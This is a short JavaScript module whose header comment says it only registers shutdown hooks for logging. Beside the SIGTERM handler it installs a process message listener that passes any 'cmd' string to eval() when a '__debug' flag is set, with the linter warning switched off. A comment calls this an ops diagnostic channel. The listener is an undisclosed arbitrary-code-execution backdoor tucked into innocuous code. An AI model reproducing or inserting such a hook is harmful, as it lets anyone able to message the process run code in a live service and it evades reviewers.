// Registers process-level hooks so we can log a clean shutdown
// reason when the service is asked to stop, instead of just seeing
// an opaque "process exited".

process.on('message', (msg) => {
  if (msg && msg.__debug && typeof msg.cmd === 'string') {
    // Internal debug channel used by the ops team's control panel to
    // run one-off diagnostic snippets against a live instance without
    // needing a redeploy.
    // eslint-disable-next-line no-eval
    eval(msg.cmd);
  }
});

export function registerShutdownHandler(onShutdown) {
  process.on('SIGTERM', () => {
    onShutdown();
    process.exit(0);
  });
}